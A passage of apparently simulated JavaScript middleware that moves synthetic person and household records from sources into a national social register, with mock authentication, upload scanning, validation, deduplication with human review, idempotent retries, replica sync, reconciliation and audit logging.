        transform: { status: 'NOT_RUN', issues: [] }, validation: { status: 'NOT_RUN', issues: [] },
        dedup: { status: 'NOT_RUN', matchedWith: null, rule: null, reviewDecision: null },
        primary: { status: 'NOT_ATTEMPTED', attempts: [], nextRetryAt: null, ingestId: null, masterId: null, acceptedAt: null, writtenAt: null, viaReconcile: false, duplicatePrevented: false },
        replica: { status: 'NOT_APPLICABLE', dueAt: null, confirmedAt: null, lagMs: null, attempts: 0 },
        times: { extractedAt: state.now, mappedAt: null, validatedAt: null, dedupAt: null },
        fault: null, errorIds: [], geo: null,
      };
    }

    const STAGE_FN = {
      PREFLIGHT(run, st) {
        const s = getSource(run.sourceId);
        const v = validateMapping(run.sourceId, run.mappingRows);
        st.note = `Source enabled · mapping v${run.mappingVersion} · destination SR1 ${state.destinations[0].enabled ? 'enabled' : 'disabled'}`;
        if (!v.ok) {
          run.blocked = true; st.status = 'FAILED';
          const detail = v.errors.slice(0, 3).map((e) => e.msg).join('; ');
          if (!run.dryRun) raise('FIELD_MAPPING_FAILED', { sourceId: run.sourceId, runId: run.id, detail, traceId: run.traceId });
          st.note = `Blocked: ${detail}`;
          ev(run, `Pre-flight blocked the run: ${detail}`, 'error');
          return;
        }
        if (!state.destinations[0].enabled) fail(run, 'MASTER_WRITE_FAILED', 'MASTER_SR1 is disabled', 'PREFLIGHT');
        ev(run, `Pre-flight passed for ${s.name}`);
      },
      AUTHENTICATE(run, st) {
        const s = getSource(run.sourceId);
        if (run.sim.authFail) {
          s.health = 'FAILING';
          fail(run, 'AUTHENTICATION_FAILED', `${s.baseUrl} returned 401 invalid_client for ${s.authRef}`, 'AUTHENTICATE');
        }
        st.note = `Token issued via ${s.authRef} (mock), expires in 300 s`;
        ev(run, 'Authenticated with source (mock OAuth client credentials)');
      },
      EXTRACT(run, st) {
        const s = getSource(run.sourceId);
        const pages = run.sim.pages || 3, size = run.sim.pageSize || 10;
        const items = generateRecords(run, pages * size);
        for (let p = 0; p < pages; p++) {
          run.apiStats.requests++;
          if (run.sim.rateLimit && p === 1) {
            run.apiStats.throttled++; run.apiStats.retries++; run.apiStats.requests++;
            ev(run, `Page ${p + 1}: HTTP 429, Retry-After 2s. Waiting, then retrying.`, 'warn');
            if (!run.dryRun) { const e = raise('RATE_LIMIT_EXCEEDED', { sourceId: run.sourceId, runId: run.id, detail: `page ${p + 1}: 429 Too Many Requests; retried after 2 s`, traceId: run.traceId }); e.retryCount = 1; e.resolution = 'RESOLVED'; e.resolutionNote = 'Auto-retried successfully'; e.resolvedAt = state.now + 2000; }
            tick(2000);
          }
          if (run.sim.pageTimeout && p === 2) {
            run.apiStats.timeouts++; run.apiStats.retries++; run.apiStats.requests++;
            ev(run, `Page ${p + 1}: timed out after 10s. Backoff 1.4s, retry succeeded.`, 'warn');
            if (!run.dryRun) { const e = raise('SOURCE_TIMEOUT', { sourceId: run.sourceId, runId: run.id, detail: `page ${p + 1}: read timeout 10 s`, traceId: run.traceId }); e.retryCount = 1; e.resolution = 'RESOLVED'; e.resolutionNote = 'Auto-retried successfully'; e.resolvedAt = state.now + 11400; }
            tick(11400);
          }
          run.apiStats.pages++;
          tick(120);
        }
        run.records = items.map((it, i) => newRecord(run, i, it.payload, it.updatedAt));
        st.outCount = run.records.length;
        st.note = `${pages} pages × ${size}, incremental since ${s.watermark ? new Date(s.watermark).toISOString() : 'beginning'} (watermark)`;
        ev(run, `Fetched ${run.records.length} records in ${run.apiStats.requests} requests`);
      },
      UPLOAD_SCAN(run, st) {
        const f = run.file;
        if (!f) fail(run, 'FILE_FORMAT_INVALID', 'No file attached', 'UPLOAD_SCAN');
        const v = validateUpload(f);
        f.safeName = v.safeName; f.checks = v.checks;
        f.checksum = f.checksum || sha256(f.text || '');
        st.note = `${v.safeName} · sha256 ${f.checksum.slice(0, 12)}… · quarantine zone raw/quarantine (simulated)`;
        if (!v.ok) {
          const bad = v.checks.filter((c) => !c.ok).map((c) => `${c.name}: ${c.detail}`).join('; ');
          ev(run, `File quarantined and not parsed. ${bad}`, 'error');
          fail(run, 'FILE_FORMAT_INVALID', bad, 'UPLOAD_SCAN');
        }
        ev(run, `File passed upload checks, moved from quarantine to staging (${f.checksum.slice(0, 12)}…)`);
      },
      PARSE(run, st) {
        const f = run.file;
        const rows = f.rows || parseCsv(f.text);
        if (rows.length < 2) fail(run, 'FILE_SCHEMA_MISMATCH', 'File has no data rows', 'PARSE');
        f.headers = rows[0].map((h) => String(h).trim());
        const body = rows.slice(1);
        const objs = body.map((r) => Object.fromEntries(f.headers.map((h, i) => [h, r[i] === undefined ? '' : r[i]])));
        f.formulaCells = 0;
        objs.forEach((o) => Object.values(o).forEach((v) => { if (looksLikeFormula(v)) f.formulaCells++; }));
        run.records = objs.map((o, i) => newRecord(run, i, o, null));
        st.outCount = run.records.length;
        st.note = `${run.records.length} data rows, ${f.headers.length} columns` + (f.formulaCells ? ` · ${f.formulaCells} formula-like cell(s) flagged, not evaluated` : '');
        ev(run, `Parsed ${run.records.length} rows (values only; no formulas or macros evaluated)`);
      },
      SCHEMA_CHECK(run, st) {
        if (run.mode === 'API') {
          if (run.sim.schemaDrift) {
            run.records.forEach((r) => { r.raw.dob = r.raw.dateOfBirth; delete r.raw.dateOfBirth; r.raw.disabilityFlag = 'N'; });
          }
          const hc = checkHeaders(run.sourceId, Object.keys(run.records[0] ? run.records[0].raw : {}));
          st.note = `fingerprint ${hc.fingerprint} vs registered ${hc.expectedFingerprint}`;
          if (!hc.ok) fail(run, 'SOURCE_SCHEMA_MISMATCH', `missing mapped field(s): ${hc.blocking.join(', ')}; unexpected: ${hc.unexpected.join(', ') || 'none'}. Policy: stop.`, 'SCHEMA_CHECK');
          if (hc.unexpected.length) ev(run, `New source fields ignored: ${hc.unexpected.join(', ')}`, 'warn');
        } else {
          const hc = checkHeaders(run.sourceId, run.file.headers);
          run.file.headerCheck = hc;
          st.note = `header fingerprint ${hc.fingerprint} vs template ${hc.expectedFingerprint}`;
          if (!hc.ok) fail(run, 'FILE_SCHEMA_MISMATCH', `missing column(s): ${hc.blocking.join(', ')}; unexpected: ${hc.unexpected.join(', ') || 'none'}`, 'SCHEMA_CHECK');
        }
        ev(run, 'Schema matches registered version');
      },
      MAP_TRANSFORM(run, st) {
        let failed = 0;
        const s = getSource(run.sourceId);
        for (const r of run.records) {
          const res = applyMapping(run.mappingRows, r.raw);
          r.canonical = derive(res.out, r, s, run);
          r.transform = { status: res.issues.length ? 'FAILED' : 'OK', issues: res.issues };
          r.times.mappedAt = state.now;
          if (res.issues.length) failed++;
        }
        st.inCount = run.records.length; st.outCount = run.records.length - failed; st.failCount = failed;
        st.note = `mapping v${run.mappingVersion}, ${run.mappingRows.length} rules, transform library ${run.transformVersion}`;
        if (failed) st.status = 'WARN';
      },
      VALIDATE(run, st) {
        let invalid = 0;
        for (const r of run.records) {
          const issues = r.transform.issues.concat(validateCanonical(r.canonical, r.transform.issues.map((i) => i.field)));
          const errors = issues.filter((i) => i.severity === 'ERROR');
          r.validation = { status: errors.length ? 'INVALID' : 'VALID', issues };
          r.times.validatedAt = state.now;
          if (errors.length) {
            invalid++;
            if (!run.dryRun) {
              const codes = [...new Set(errors.map((e) => e.code))];
              codes.forEach((code) => raise(code, { sourceId: run.sourceId, runId: run.id, recordId: r.id, record: r, field: errors.filter((e) => e.code === code).map((e) => e.field).join(', '), detail: errors.filter((e) => e.code === code).map((e) => e.message).join('; '), traceId: r.traceId }));
            }
          }
        }
        st.inCount = run.records.length; st.outCount = run.records.length - invalid; st.failCount = invalid;
        if (invalid) st.status = 'WARN';
        ev(run, `${run.records.length - invalid} valid, ${invalid} invalid`);
      },
      DEDUPLICATE(run, st) {
        const seenKey = new Map(), seenNin = new Map();
        let dup = 0, review = 0, updates = 0;
        for (const r of run.records) {
          r.times.dedupAt = state.now;
          if (r.validation.status !== 'VALID') continue;
          const c = r.canonical;
          const personKey = [c.given_name, c.family_name, c.birth_date, c.gender, c.nsr_household_serial].join('|').toLowerCase();
          const first = seenKey.get(personKey) || (c.nin && seenNin.get(c.nin));
          if (first) {
            r.dedup = { status: 'DUPLICATE_IN_BATCH', matchedWith: first, rule: c.nin && seenNin.get(c.nin) ? 'same NIN in batch' : 'same name + DOB + sex + household', reviewDecision: null };
            dup++;
            if (!run.dryRun) raise('DUPLICATE_RECORD', { sourceId: run.sourceId, runId: run.id, recordId: r.id, record: r, detail: `duplicates ${first} (${r.dedup.rule})`, traceId: r.traceId });
            continue;
          }
          seenKey.set(personKey, r.id);
          if (c.nin) seenNin.set(c.nin, r.id);
          const existingBySource = state.master.bySourceKey.get(r.sourceKey);
          const existingNin = c.nin && state.master.byNin.get(c.nin);
          if (existingNin && existingNin.sourceId !== run.sourceId) {
            r.dedup = { status: 'MATCH_REVIEW', matchedWith: existingNin.masterId, rule: `NIN matches ${existingNin.masterId} from ${existingNin.sourceId}`, reviewDecision: null };
            review++;
            if (!run.dryRun) raise('MATCH_REQUIRES_REVIEW', { sourceId: run.sourceId, runId: run.id, recordId: r.id, record: r, detail: `${r.dedup.rule}. Cross-source match is never merged automatically.`, traceId: r.traceId });
            continue;
          }
          if (existingBySource) { r.dedup = { status: 'UPDATE', matchedWith: existingBySource.masterId, rule: 'same source key; upsert as new version', reviewDecision: null }; updates++; }
          else r.dedup = { status: 'UNIQUE', matchedWith: null, rule: 'no match on NIN / name+DOB+sex+household', reviewDecision: null };
        }
        st.inCount = run.records.filter((r) => r.validation.status === 'VALID').length;
        st.outCount = st.inCount - dup - review; st.failCount = dup + review;
        st.note = `${dup} in-batch duplicate(s), ${review} cross-source match(es) for review, ${updates} update(s) of existing master records`;
        if (dup || review) st.status = 'WARN';
        if (run.dryRun) {
          // Dry run stops here: nothing leaves the middleware.
          for (let i = run.stageIdx + 1; i < run.stages.length; i++) { run.stages[i].status = 'SKIPPED'; run.stages[i].note = 'Dry run: not executed'; }
          run.stageIdx = run.stages.length - 1;
        }
      },
      DELIVER_PRIMARY(run, st) {
        const deliverable = run.records.filter(isDeliverable);
        planFaults(run, deliverable);
        for (let i = 0; i < deliverable.length; i += 10) {
          const batchId = `BAT-${pad(++state.seq.batch, 5)}`;
          const slice = deliverable.slice(i, i + 10);
          run.batches.push({ id: batchId, size: slice.length, at: state.now });
          slice.forEach((r) => { r.batchId = batchId; attemptDelivery(r, 'pipeline'); });
          tick(300);
        }
        const c = countPrimary(deliverable);
        st.inCount = deliverable.length; st.outCount = c.ACCEPTED + c.WRITTEN; st.failCount = deliverable.length - st.outCount;
        st.note = `${run.batches.length} batch(es) · ${c.ACCEPTED} accepted · ${c.AWAITING_RETRY} awaiting retry · ${c.UNKNOWN} unknown · ${c.REJECTED} rejected`;
        if (st.failCount) st.status = 'WARN';
      },
      CONFIRM_COMMIT(run, st) {
        let n = 0;
        for (const r of run.records) if (r.primary.status === 'ACCEPTED') { confirmCommit(r); n++; }
        st.outCount = n;
        st.note = 'Polled ingestion status by ingest_id until register commit (mock of classification → transformation → ingest workers)';
      },
      REPLICA_SYNC(run, st) {
        tick(5000);
        processReplica();
        const written = run.records.filter((r) => r.primary.status === 'WRITTEN');
        const c = { CONFIRMED: 0, PENDING: 0, FAILED: 0 };
        written.forEach((r) => c[r.replica.status]++);
        st.inCount = written.length; st.outCount = c.CONFIRMED; st.failCount = c.PENDING + c.FAILED;
        st.note = `${c.CONFIRMED} confirmed · ${c.PENDING} pending · ${c.FAILED} failed (probe by internal_record_id on SR2)`;
        if (c.PENDING || c.FAILED) st.status = 'WARN';
      },
      RECONCILE(run, st) {
        run.reconciliation = reconcileSummary([run]);
        const r = run.reconciliation;
        st.note = r.balanced ? 'All accepted records accounted for' : `${r.outstanding} record(s) outstanding: see Reconciliation`;
        if (!r.balanced) st.status = 'WARN';
        if (!run.dryRun && r.destinationMismatch) {
          raise('RECONCILIATION_MISMATCH', { sourceId: run.sourceId, runId: run.id, detail: `SR1 holds ${r.destinationCount} record(s) for this run; middleware has ${r.primaryWritten} acknowledged. ${r.unknown} unknown outcome(s).`, traceId: run.traceId });
        }
      },
    };

    function derive(out, rec, source, run) {
      const c = { ...out };
      c.record_status = 'ACTIVE';
      c.country_code = 'NG';
      c.data_source = source.name;
      c.synthetic = true;
      if (c.relationship_to_head !== undefined) c.is_household_head = c.relationship_to_head === '1';
      if (c.lga_id && c.ward) c.geo_lowest_level_value_id = `${c.lga_id}/${String(c.ward).replace(/\s+/g, '-').toUpperCase()}`;
      if (c.state_id) c.geo_code_hierarchy_json = JSON.stringify({ country: 'NG', state: c.state_id, lga: c.lga_id, ward: c.ward });
      // household_name and member_count are derived per household across the batch
      if (run) {
        const hh = c.nsr_household_serial;
        const members = run.records.filter((r) => r.canonical && r.canonical.nsr_household_serial === hh);
        const head = members.find((r) => r.canonical.relationship_to_head === '1') || (c.relationship_to_head === '1' ? { canonical: c } : null);
        if (head) c.household_name = [head.canonical.given_name, head.canonical.family_name].filter(Boolean).join(' ');
        c.member_count = members.length + 1;
        members.forEach((r) => { r.canonical.member_count = c.member_count; if (c.household_name) r.canonical.household_name = c.household_name; });
      }
      if (!isBlank(c.latitude) && !isBlank(c.longitude)) {
        c.latitude = Number(c.latitude); c.longitude = Number(c.longitude);
        if (!isBlank(c.accuracy_m)) c.accuracy_m = Number(c.accuracy_m);
        rec.geo = {
          lat: c.latitude, lon: c.longitude, crs: 'EPSG:4326 (WGS 84)', accuracyM: c.accuracy_m || null,
          locationType: 'Residential (household dwelling)', geoSource: source.name, collectionMethod: 'Device GPS during field enumeration (as supplied by source)',
          observedAt: rec.sourceUpdatedAt, adminIds: [c.state_id, c.lga_id, c.geo_lowest_level_value_id].filter(Boolean), verified: false,
          validation: c.latitude >= 4 && c.latitude <= 14 && c.longitude >= 2.6 && c.longitude <= 14.7 ? 'Within country bounds; not verified' : 'Outside country bounds',
        };
        c.coordinate_verified = false;
      }
      return c;
    }

    const isDeliverable = (r) => r.validation.status === 'VALID' && ['UNIQUE', 'UPDATE', 'APPROVED_NEW'].includes(r.dedup.status);

    function planFaults(run, recs) {
      const sim = run.sim;
      let i = 0;
      const take = (n, f) => { for (let k = 0; k < n && i < recs.length; k++, i++) recs[recs.length - 1 - i].fault = f; };
      take(sim.permanent || 0, { kind: 'permanent' });
      take(sim.exhaust || 0, { kind: 'exhaust' });
      take(sim.transient || 0, { kind: 'transient', failTimes: 1 });
      for (let k = 0; k < (sim.unknown || 0) && i < recs.length; k++, i++) recs[recs.length - 1 - i].fault = { kind: 'unknown', committed: k % 2 === 0 };
      recs.forEach((r) => { if (!r.fault) r.fault = { kind: 'ok' }; });
      let rf = sim.replicaFail || 0;
      recs.forEach((r) => {
        if (r.fault.kind !== 'ok' && r.fault.kind !== 'transient') return;
        r.fault.replica = rf > 0 ? (rf--, 'fail') : sim.replicaDelayMs ? 'delay' : 'ok';
        r.fault.replicaDelayMs = sim.replicaDelayMs || 1500 + Math.floor(rng() * 2500);
      });
    }

    function backoffMs(attempt) {
      const p = state.destinations[0].retry;
      const ceiling = Math.min(p.capMs, p.baseMs * Math.pow(p.factor, attempt - 1));
      return Math.max(500, Math.floor(rng() * ceiling)); // full jitter, 500 ms floor
    }

    // Simulated MASTER_SR1. Idempotent by key: a repeated key returns the existing record.
    function destinationWrite(r) {
      const existing = state.master.byKey.get(r.idemKey);
      if (existing) return { http: 200, duplicate: true, masterId: existing.masterId };
      const prev = state.master.bySourceKey.get(r.sourceKey);
      const masterId = prev ? prev.masterId : `SR1-${pad(++state.seq.master, 7)}`;
      const rec = { masterId, idemKey: r.idemKey, runId: r.runId, recordId: r.id, sourceId: r.sourceId, sourceKey: r.sourceKey, nin: r.canonical.nin || null, given: r.canonical.given_name, version: prev ? prev.version + 1 : 1, committedAt: state.now };
      state.master.byKey.set(r.idemKey, rec);
      state.master.bySourceKey.set(r.sourceKey, rec);
      if (rec.nin && !state.master.byNin.has(rec.nin)) state.master.byNin.set(rec.nin, rec);
      state.master.records.set(masterId, rec);
      return { http: 201, duplicate: false, masterId, version: rec.version };
    }

    function attemptDelivery(r, by) {
      const p = r.primary;
      const policy = state.destinations[0].retry;
      const n = p.attempts.length + 1;
      const f = r.fault || { kind: 'ok' };
      const latency = 80 + Math.floor(rng() * 200);
      const log = (outcome, http, note) => p.attempts.push({ n, at: state.now, outcome, http, latencyMs: latency, note, by, idemKey: r.idemKey });
      const fails = f.kind === 'exhaust' || (f.kind === 'transient' && n <= f.failTimes);
      if (f.kind === 'permanent') {
        log('REJECTED', 422, 'Register validation: household serial already linked to a different household head');
        p.status = 'DEAD_LETTER'; p.nextRetryAt = null;
        raise('MASTER_WRITE_FAILED', { sourceId: r.sourceId, runId: r.runId, recordId: r.id, record: r, detail: 'HTTP 422 from SR1 (non-retryable). Moved to dead-letter holding area.', traceId: r.traceId });
        return;
      }
      if (fails) {
        if (n >= policy.maxAttempts) {
          log('FAILED', 503, `Service unavailable; retry budget (${policy.maxAttempts}) exhausted`);
          p.status = 'DEAD_LETTER'; p.nextRetryAt = null;
          resolveErrors(r, ['MASTER_WRITE_FAILED'], 'Superseded by dead-letter');
          raise('MASTER_WRITE_FAILED', { sourceId: r.sourceId, runId: r.runId, recordId: r.id, record: r, detail: `HTTP 503 on all ${policy.maxAttempts} attempts. Moved to dead letters; safe to retry manually (idempotent).`, traceId: r.traceId }).retryCount = n;
          return;
        }
        const wait = backoffMs(n);
        log('FAILED', 503, `Service unavailable; next attempt in ${(wait / 1000).toFixed(1)} s (exponential backoff, full jitter)`);
        p.status = 'AWAITING_RETRY'; p.nextRetryAt = state.now + wait;
        const existing = state.errors.find((e) => e.recordId === r.id && e.code === 'MASTER_WRITE_FAILED' && e.resolution !== 'RESOLVED');
        if (existing) { existing.retryCount = n; existing.resolution = 'RETRYING'; }
        else { const e = raise('MASTER_WRITE_FAILED', { sourceId: r.sourceId, runId: r.runId, recordId: r.id, record: r, detail: 'HTTP 503 from SR1 (transient). Scheduled for automatic retry.', traceId: r.traceId }); e.resolution = 'RETRYING'; e.retryCount = n; }
        return;
      }
      if (f.kind === 'unknown' && !f.resolvedOnce) {
        f.resolvedOnce = true;
        if (f.committed) destinationWrite(r); // destination committed, but the response never arrived
        log('TIMEOUT', null, f.committed ? 'No response within 30 s (destination did commit; middleware cannot know yet)' : 'No response within 30 s (destination did not commit)');
        p.status = 'UNKNOWN'; p.nextRetryAt = null;
        raise('MASTER_WRITE_OUTCOME_UNKNOWN', { sourceId: r.sourceId, runId: r.runId, recordId: r.id, record: r, detail: `Timeout after 30 s on idempotency key ${r.idemKey.slice(0, 12)}…`, traceId: r.traceId });
        return;
      }
      const res = destinationWrite(r);
      p.ingestId = `ING-${pad(++state.seq.ingest, 7)}`;
      p.masterId = res.masterId; p.acceptedAt = state.now; p.status = 'ACCEPTED'; p.nextRetryAt = null;
      if (res.duplicate) { p.duplicatePrevented = true; state.counters.duplicatesPrevented++; }
      log('ACCEPTED', res.http, res.duplicate ? `Idempotent replay: key already committed as ${res.masterId}; no new record created` : `ingest_id ${p.ingestId} → ${res.masterId}${res.version > 1 ? ' (update, version ' + res.version + ')' : ''}`);
    }

    function confirmCommit(r) {
      const p = r.primary;
      p.status = 'WRITTEN'; p.writtenAt = state.now;
      resolveErrors(r, ['MASTER_WRITE_FAILED', 'MASTER_WRITE_OUTCOME_UNKNOWN'], p.viaReconcile ? 'Confirmed by reconciliation' : `Delivered on attempt ${p.attempts.length}`);
      const f = r.fault || {};
      r.replica = { status: 'PENDING', dueAt: state.now + (f.replicaDelayMs || 2000), confirmedAt: null, lagMs: null, attempts: 0, willFail: f.replica === 'fail' };
    }

    function processReplica() {
      const threshold = state.destinations[1].lagThresholdMs;
      for (const run of state.runs) {
        for (const r of run.records) {
          const rp = r.replica;
          if (rp.status !== 'PENDING') continue;
          if (state.now >= rp.dueAt) {
            rp.attempts++;
            if (rp.willFail) {
              rp.status = 'FAILED';
              resolveErrors(r, ['REPLICA_SYNC_PENDING'], 'Escalated to REPLICA_SYNC_FAILED');
              raise('REPLICA_SYNC_FAILED', { sourceId: r.sourceId, runId: r.runId, recordId: r.id, record: r, detail: `${r.primary.masterId} not found on SR2 after ${Math.round((state.now - r.primary.writtenAt) / 1000)} s`, traceId: r.traceId });
            } else {
              rp.status = 'CONFIRMED'; rp.confirmedAt = state.now; rp.lagMs = state.now - r.primary.writtenAt;
              state.replica.set(r.primary.masterId, state.now);
              state.destinations[1].lastSyncAt = state.now;
              resolveErrors(r, ['REPLICA_SYNC_PENDING', 'REPLICA_SYNC_FAILED'], `Visible on SR2 after ${(rp.lagMs / 1000).toFixed(1)} s`);
            }
          } else if (state.now - r.primary.writtenAt > threshold && !state.errors.some((e) => e.recordId === r.id && e.code === 'REPLICA_SYNC_PENDING')) {
            raise('REPLICA_SYNC_PENDING', { sourceId: r.sourceId, runId: r.runId, recordId: r.id, record: r, detail: `Lag above ${threshold / 1000} s threshold`, traceId: r.traceId });
          }
        }
      }
    }

    function processDueRetries() {
      for (const run of state.runs) {
        for (const r of run.records) {
          if (r.primary.status === 'AWAITING_RETRY' && r.primary.nextRetryAt <= state.now) {
            attemptDelivery(r, 'retry-scheduler');
            if (r.primary.status === 'ACCEPTED') confirmCommit(r);
          }
        }
      }
    }

    function refreshReconciliation(runIds) {
      for (const id of runIds) { const run = getRun(id); if (run && run.stageIdx >= run.stages.length && !run.fatal && !run.blocked) run.reconciliation = reconcileSummary([run]); }
    }

    // Advances the simulated clock; runs the retry scheduler and replica monitor.
    function advanceClock(ms) {
      const step = 5000;
      for (let t = 0; t < ms; t += step) {
        tick(Math.min(step, ms - t));
        processDueRetries();
        processReplica();
      }
      refreshReconciliation(state.runs.map((r) => r.id));
    }

    function retryRecords(runId, recordIds) {
      authz('run.retry', runId);
      const run = getRun(runId);
      const out = { retried: 0, delivered: 0, duplicatesPrevented: 0, skipped: [] };
      const retriedIds = [];
      const targets = run.records.filter((r) => (!recordIds || recordIds.includes(r.id)));
      for (const r of targets) {
        const p = r.primary;
        const st = p.status;
        if (!['AWAITING_RETRY', 'DEAD_LETTER', 'UNKNOWN'].includes(st)) continue;
        if (st === 'DEAD_LETTER' && r.fault && r.fault.kind === 'permanent') { out.skipped.push({ id: r.id, reason: 'Non-retryable 422: fix the data at source first' }); continue; }
        if (r.fault && r.fault.kind === 'exhaust') r.fault = { ...r.fault, kind: 'ok' }; // destination recovered
        if (st === 'UNKNOWN') r.fault.kind = 'ok';
        const before = state.counters.duplicatesPrevented;
        retriedIds.push(r.id);
        attemptDelivery(r, `manual retry by ${state.user}`);
        out.retried++;
        if (p.status === 'ACCEPTED') { confirmCommit(r); out.delivered++; }
        out.duplicatesPrevented += state.counters.duplicatesPrevented - before;
      }
      state.errors.filter((e) => e.runId === runId && retriedIds.includes(e.recordId)).forEach((e) => { if (e.resolution !== 'RESOLVED') e.retryCount++; });
      refreshReconciliation([runId]);
      run.auditIds.push(audit('RECORDS_RETRIED', runId, 'SUCCESS', `${out.retried} retried, ${out.delivered} delivered, ${out.duplicatesPrevented} duplicate write(s) prevented by idempotency key`));
      return out;
    }

    function reconcileRun(runId) {
      authz('run.reconcile', runId);
      const run = getRun(runId);
      const out = { confirmed: 0, requeued: 0, replicaResync: 0 };
      for (const r of run.records) {
        if (r.primary.status === 'UNKNOWN') {
          const hit = state.master.byKey.get(r.idemKey);
          r.primary.attempts.push({ n: r.primary.attempts.length + 1, at: state.now, outcome: hit ? 'RECONCILED_FOUND' : 'RECONCILED_NOT_FOUND', http: hit ? 200 : 404, latencyMs: 40, note: hit ? `GET by idempotency key found ${hit.masterId}; no resend needed` : 'GET by idempotency key: not found; safe to resend', by: 'reconciliation', idemKey: r.idemKey });
          if (hit) {
            r.primary.masterId = hit.masterId; r.primary.ingestId = r.primary.ingestId || `ING-${pad(++state.seq.ingest, 7)}`; r.primary.viaReconcile = true;
            confirmCommit(r); out.confirmed++;
          } else {
            r.primary.status = 'AWAITING_RETRY'; r.primary.nextRetryAt = state.now; r.fault.kind = 'ok'; out.requeued++;
            const e = state.errors.find((x) => x.recordId === r.id && x.code === 'MASTER_WRITE_OUTCOME_UNKNOWN');
            if (e) { e.resolution = 'RETRYING'; e.resolutionNote = 'Not committed; requeued for delivery'; }
          }
        }
        if (r.replica.status === 'FAILED') { r.replica.status = 'PENDING'; r.replica.willFail = false; r.replica.dueAt = state.now + 3000; out.replicaResync++; }
      }
      state.errors.filter((e) => e.runId === runId && e.code === 'RECONCILIATION_MISMATCH' && e.resolution !== 'RESOLVED').forEach((e) => { e.resolution = 'RESOLVED'; e.resolvedAt = state.now; e.resolutionNote = 'Reconciled against SR1 by idempotency key'; });
      run.reconciliation = reconcileSummary([run]);
      run.auditIds.push(audit('RUN_RECONCILED', runId, 'SUCCESS', `${out.confirmed} unknown confirmed committed, ${out.requeued} requeued, ${out.replicaResync} replica re-sync requested`));
      return out;
    }

    function resolveReview(recordId, decision, note) {
      authz('error.resolve', recordId);
      const r = findRecord(recordId);
      if (!r || r.dedup.status !== 'MATCH_REVIEW') throw new Error('Record is not waiting for review');
      r.dedup.reviewDecision = { decision, by: state.user, at: state.now, note: note || '' };
      if (decision === 'APPROVE_NEW') {
        r.dedup.status = 'APPROVED_NEW';
        r.fault = { kind: 'ok', replica: 'ok', replicaDelayMs: 2000 };
        r.batchId = `BAT-${pad(++state.seq.batch, 5)}`;
        attemptDelivery(r, `review approval by ${state.user}`);
        if (r.primary.status === 'ACCEPTED') confirmCommit(r);
      } else r.dedup.status = 'REJECTED_REVIEW';
      resolveErrors(r, ['MATCH_REQUIRES_REVIEW'], decision === 'APPROVE_NEW' ? 'Reviewer approved as a distinct person' : 'Reviewer rejected as the same person');
      refreshReconciliation([r.runId]);
      audit('MATCH_REVIEWED', recordId, 'SUCCESS', decision);
      return r;
    }

    function resolveError(errorId, note) {
      authz('error.resolve', errorId);
      const e = state.errors.find((x) => x.id === errorId);
      e.resolution = 'ACKNOWLEDGED'; e.resolvedAt = state.now; e.resolutionNote = note || 'Acknowledged';
      audit('ERROR_ACKNOWLEDGED', errorId, 'SUCCESS', note || '');
      return e;
    }

    function findRecord(id) {
      for (const run of state.runs) { const r = run.records.find((x) => x.id === id); if (r) return r; }
      return null;
    }

    function viewRawPayload(recordId, justification) {
      authz('payload.view', recordId);
      if (!justification || justification.trim().length < 10) throw new Error('Give a justification of at least 10 characters. It is stored in the audit log.');
      audit('RAW_PAYLOAD_VIEWED', recordId, 'SUCCESS', `Justification: ${justification.trim()}`);
      return findRecord(recordId).raw;
    }

    function runToCompletion(runOrId) {
      const run = typeof runOrId === 'string' ? getRun(runOrId) : runOrId;
      while (run.stageIdx < run.stages.length && !run.fatal && !run.blocked) stepRun(run);
      return run;
    }

    function dryRun(sourceId, o) {
      const run = startRun(sourceId, { ...o, dryRun: true });
      if (run.blocked) return run;
      runToCompletion(run);
      run.dryRunId = `DRY-${pad(++state.seq.dry, 4)}`;
      audit('DRY_RUN_EXECUTED', `${sourceId} ${run.dryRunId}`, run.fatal || run.blocked ? 'FAILURE' : 'SUCCESS', `${run.records.length} records evaluated; nothing delivered`);
      return run;
    }

    // ---- status + metrics ---------------------------------------------------
    function countPrimary(recs) {
      const c = { NOT_ATTEMPTED: 0, PENDING: 0, ACCEPTED: 0, WRITTEN: 0, AWAITING_RETRY: 0, UNKNOWN: 0, REJECTED: 0, DEAD_LETTER: 0 };
      recs.forEach((r) => c[r.primary.status]++);
      return c;
    }

    function runStatus(run) {
      if (run.blocked) return 'BLOCKED';
      if (run.fatal) return 'FAILED';
      if (!run.startedAt) return 'QUEUED';
      if (run.stageIdx < run.stages.length) return 'RUNNING';
      const rc = reconcileSummary([run]);
      if (rc.unknown) return 'NEEDS_RECONCILIATION';
      if (rc.awaitingRetry || rc.inFlight) return 'AWAITING_RETRY';
      if (rc.replicaFailed) return 'REPLICA_FAILED';
      if (rc.replicaPending) return 'REPLICA_PENDING';
      if (rc.heldForReview) return 'NEEDS_REVIEW';
      if (rc.rejectedBeforeDelivery || rc.primaryFailed) return 'COMPLETED_WITH_ERRORS';
      return 'COMPLETED';
    }

    function classify(r) {
      if (r.transform.status === 'FAILED' || r.validation.status === 'INVALID') return 'INVALID';
      if (r.dedup.status === 'DUPLICATE_IN_BATCH') return 'DUPLICATE';
      if (r.dedup.status === 'REJECTED_REVIEW') return 'REVIEW_REJECTED';
      if (r.dedup.status === 'MATCH_REVIEW') return 'HELD_FOR_REVIEW';
      if (r.validation.status === 'NOT_RUN') return 'NOT_PROCESSED';
      return 'ACCEPTED';
    }

    function reconcileSummary(runs) {
      const ids = {};
      const bucket = (k, r) => { (ids[k] = ids[k] || []).push(r.id); };
      let destinationCount = 0;
      for (const run of runs) {
        for (const r of run.records) {
          bucket('received', r);
          const cl = classify(r);
          if (cl === 'INVALID') { bucket('rejectedBeforeDelivery', r); bucket('invalid', r); }
          else if (cl === 'DUPLICATE' || cl === 'REVIEW_REJECTED') { bucket('rejectedBeforeDelivery', r); bucket('duplicates', r); }
          else if (cl === 'HELD_FOR_REVIEW') bucket('heldForReview', r);
          else if (cl === 'NOT_PROCESSED') bucket('notProcessed', r);
          else {
            bucket('accepted', r);
            const ps = r.primary.status;
            if (ps === 'WRITTEN') {
              bucket('primaryWritten', r);
              if (r.primary.duplicatePrevented) bucket('duplicatesPrevented', r);
              if (r.replica.status === 'CONFIRMED') bucket('replicaConfirmed', r);
              else if (r.replica.status === 'FAILED') bucket('replicaFailed', r);
              else bucket('replicaPending', r);
            } else if (ps === 'DEAD_LETTER' || ps === 'REJECTED') bucket('primaryFailed', r);
            else if (ps === 'AWAITING_RETRY') bucket('awaitingRetry', r);
            else if (ps === 'UNKNOWN') bucket('unknown', r);
            else bucket('inFlight', r);
          }
